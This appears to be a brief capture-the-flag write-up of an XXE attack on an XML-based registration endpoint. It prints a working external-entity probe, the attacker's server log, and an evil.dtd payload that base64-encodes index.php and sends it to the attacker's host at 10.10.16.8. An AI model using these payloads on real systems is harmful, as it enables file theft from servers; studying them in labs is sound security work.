# Entry point

Example of an xml file that is passed to backend
```
<?xml version="1.0" encoding="UTF-8"?>
<root>
  <method>POST</method>
  <uri>/auth/register</uri>
  <user>
    <username>username_value</username>
    <password>password_value</password>
  </user>
</root>
```

We can check for XXE vuln by declaring the following entity inside the ```<?xml>``` and hosting an http server
```
<!DOCTYPE test [ 
<!ENTITY % xxe SYSTEM "http://10.10.16.8"> 
%xxe;
]>
```
Attacker machine
```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.192 - - [12/May/2023 12:35:19] "GET / HTTP/1.1" 200 -
```

we can host a malicious evil.dtd that exfiltrates file contents
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://10.10.16.8/evil.dtd">%xxe;]>>
```
```
<!ENTITY % file SYSTEM 'php://filter/convert.base64-encode/resource=index.php'>
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://10.10.16.8/?exfil=%file;'>">
%eval;
%exfiltrate;
```
